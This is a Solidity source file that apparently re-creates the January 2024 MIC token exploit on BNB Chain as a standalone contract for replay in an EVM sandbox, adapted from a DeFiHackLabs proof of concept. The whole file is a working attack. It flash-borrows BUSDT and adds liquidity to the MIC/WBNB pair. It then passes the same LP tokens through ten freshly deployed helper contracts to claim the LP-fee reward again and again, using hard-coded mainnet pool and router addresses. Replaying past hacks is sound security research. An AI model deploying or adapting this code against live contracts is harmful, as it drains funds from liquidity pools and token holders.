// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

// Synthetic standalone exploit for the EVM Playground (2024-01-MIC).
// The DeFiHackLabs PoC runs the whole attack INLINE in the Foundry test
// contract (attacker = address(this); the PancakeV3 flash callback
// `pancakeV3FlashCallback` lives on the test itself), so there is no
// standalone contract to deploy. This contract is a faithful, self-contained
// copy of that inline attack so the playground can deploy it and record
// run(). Logic and constants are copied verbatim from test/MIC_exp.sol
// (ContractTest.testExploit / pancakeV3FlashCallback / LPFeeClaimer), with
// two adaptations:
//   1. The original test's `deal(BUSDT, this, balanceOf(this) + dust)` right
//      after the flash-loan receipt (a tiny 0.00331 BUSDT top-up to absorb
//      fee-on-transfer rounding) cannot be called mid-execution from inside
//      a contract. Since the flash loan itself is a straight balance credit
//      with nothing spent before the top-up, the two additions commute — the
//      config's `setup.dealToken` step pre-funds the exploit with the same
//      dust BEFORE the recorded flash loan, producing the identical final
//      BUSDT balance.
//   2. The original test's `approveRouter()` includes a `vm.prank` to
//      approve a third-party "FakeUSDT" token for the Router — but the only
//      function that would spend that approval (`FakeUSDTToBUSDT()`) is
//      commented out in the source and never called. That approval is dead
//      code and is omitted here.
//
// Root cause: MICToken.swapAndSendLPFee(address) pays the caller a pro-rata
// share of the global `amountLPFee` accumulator based on their CURRENT LP
// balance, then only decrements the global accumulator — it never records
// that a specific LP position already claimed. Recycling the SAME LP tokens
// through a chain of fresh holder contracts lets the attacker claim its
// 9.07% share of the (shrinking) pool over and over.

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
    function transfer(address, uint256) external returns (bool);
    function transferFrom(address, address, uint256) external returns (bool);
}

interface IMIC {
    function swapManual() external;
    function approve(address, uint256) external returns (bool);
    function balanceOf(address) external view returns (uint256);
}

interface IPairV3 {
    function flash(address recipient, uint256 amount0, uint256 amount1, bytes calldata data) external;
}

interface IPairV2 {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
    function transfer(address, uint256) external returns (bool);
    function transferFrom(address, address, uint256) external returns (bool);
}

interface IRouterV2 {
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external payable;

    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    ) external payable returns (uint256 amountToken, uint256 amountETH, uint256 liquidity);

    function removeLiquidityETHSupportingFeeOnTransferTokens(
        address token,
        uint256 liquidity,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    ) external returns (uint256 amountETH);
}

contract MICDrain {
    address private constant BUSDT_USDC = 0x92b7807bF19b7DDdf89b706143896d05228f3121; // PancakeV3 BUSDT/USDC (flash)
    address private constant BUSDT_MIC = 0xB3611B1cbDDB14bC847906BfB9c443AC724A54dC;
    address private constant MIC_WBNB = 0xfEe55F16FD5Aec503B73146045b1474925a74dec;
    address private constant ROUTER = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
    address private constant MIC = 0xb38C2D2d6A168D41AA8eB4CEAd47E01BadbDCF57;
    address private constant BUSDT = 0x55d398326f99059fF775485246999027B3197955;
    address payable private constant WBNB = payable(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);

    uint256 private constant FLASH_BUSDT_AMOUNT = 1700e18;

    IERC20 private constant busdt = IERC20(BUSDT);
    IMIC private constant mic = IMIC(MIC);
    IPairV2 private constant busdtMic = IPairV2(BUSDT_MIC);
    IPairV2 private constant micWbnb = IPairV2(MIC_WBNB);
    IRouterV2 private constant router = IRouterV2(ROUTER);

    // Recorded attack: flash-borrow 1,700 BUSDT from the PancakeV3 BUSDT/USDC
    // pool; the callback does the rest.
    function run() external {
        IPairV3(BUSDT_USDC).flash(address(this), FLASH_BUSDT_AMOUNT, 0, abi.encodePacked(uint8(0)));
    }

    // PancakeV3 flash callback.
    function pancakeV3FlashCallback(uint256 fee0, uint256, bytes calldata) external {
        approveRouter();

        // Swap half of BUSDT balance to MIC tokens
        BUSDTToMIC();
        // Swap second half of BUSDT tokens to BNB
        BUSDTToBNB();
        // Add liquidity to MIC/WBNB pair. Obtain LP tokens.
        router.addLiquidityETH{value: address(this).balance}(
            MIC, mic.balanceOf(address(this)), 0, 0, address(this), block.timestamp + 10
        );

        // The bug: swapManual() -> swapAndSendLPFee(msg.sender) pays a
        // pro-rata slice of the global amountLPFee based on the caller's
        // CURRENT LP balance, with no per-holder claim tracking.
        mic.swapManual();

        LPFeeClaimer currentLpFeeClaimer = new LPFeeClaimer();
        // Transfer LP tokens to helper attack contract for acquiring new LP fees.
        // Transferred amount will be approved back to this contract.
        micWbnb.transfer(address(currentLpFeeClaimer), micWbnb.balanceOf(address(this)));
        currentLpFeeClaimer.claim();

        uint256 i = 1;
        while (i < 10) {
            LPFeeClaimer newLpFeeClaimer = new LPFeeClaimer();
            // Main (this) attack contract has been approved from current
            // helper attack contract to transfer LP tokens to new helper
            // attack contract.
            micWbnb.transferFrom(
                address(currentLpFeeClaimer), address(newLpFeeClaimer), micWbnb.balanceOf(address(currentLpFeeClaimer))
            );
            newLpFeeClaimer.claim();
            currentLpFeeClaimer = newLpFeeClaimer;
            ++i;
        }
        currentLpFeeClaimer.remove();
        BNBToBUSDT();

        // Repay flashloan
        busdt.transfer(BUSDT_USDC, FLASH_BUSDT_AMOUNT + fee0);
    }

    receive() external payable {}

    function approveRouter() private {
        mic.approve(ROUTER, type(uint256).max);
        busdtMic.approve(ROUTER, type(uint256).max);
        busdt.approve(ROUTER, type(uint256).max);
    }

    function BUSDTToMIC() private {
        address[] memory path = new address[](2);
        path[0] = BUSDT;
        path[1] = MIC;
        router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            busdt.balanceOf(address(this)) / 2, 0, path, address(this), block.timestamp + 10
        );
    }

    function BUSDTToBNB() private {
        address[] memory path = new address[](2);
        path[0] = BUSDT;
        path[1] = WBNB;
        router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            busdt.balanceOf(address(this)), 0, path, address(this), block.timestamp + 10
        );
    }

    function BNBToBUSDT() private {
        address[] memory path = new address[](2);
        path[0] = WBNB;
        path[1] = BUSDT;
        router.swapExactETHForTokensSupportingFeeOnTransferTokens{value: address(this).balance}(
            0, path, address(this), block.timestamp + 10
        );
    }
}

contract LPFeeClaimer {
    address private constant MIC_WBNB = 0xfEe55F16FD5Aec503B73146045b1474925a74dec;
    address private constant ROUTER = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
    address private constant MIC = 0xb38C2D2d6A168D41AA8eB4CEAd47E01BadbDCF57;
    address private constant BUSDT = 0x55d398326f99059fF775485246999027B3197955;

    IPairV2 private constant micWbnb = IPairV2(MIC_WBNB);
    IRouterV2 private constant router = IRouterV2(ROUTER);
    IMIC private constant mic = IMIC(MIC);
    IERC20 private constant busdt = IERC20(BUSDT);

    constructor() {
        // Approve LP tokens to main attack contract (deployer of this contract).
        micWbnb.approve(msg.sender, type(uint256).max);
    }

    function claim() external {
        // Obtain LP fees — same recyclable-claim bug, triggered from a fresh holder.
        mic.swapManual();
        // Transfer obtained LP fees to the main attack contract
        busdt.transfer(msg.sender, busdt.balanceOf(address(this)));
    }

    // Remove liquidity (MIC/BNB), swap MIC to BNB and finally transfer swapped BNB to main attack contract
    function remove() external {
        micWbnb.approve(ROUTER, type(uint256).max);
        mic.approve(ROUTER, type(uint256).max);
        router.removeLiquidityETHSupportingFeeOnTransferTokens(
            MIC, micWbnb.balanceOf(address(this)), 0, 0, address(this), block.timestamp + 10
        );
        MICToBNB();
        // Transfer BNB to main attack contract
        (bool success,) = msg.sender.call{value: address(this).balance}("");
        require(success, "Transfering BNB not successful");
    }

    receive() external payable {}

    function MICToBNB() private {
        address[] memory path = new address[](2);
        path[0] = MIC;
        path[1] = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c; // WBNB
        router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            mic.balanceOf(address(this)), 0, path, msg.sender, block.timestamp + 10
        );
    }
}
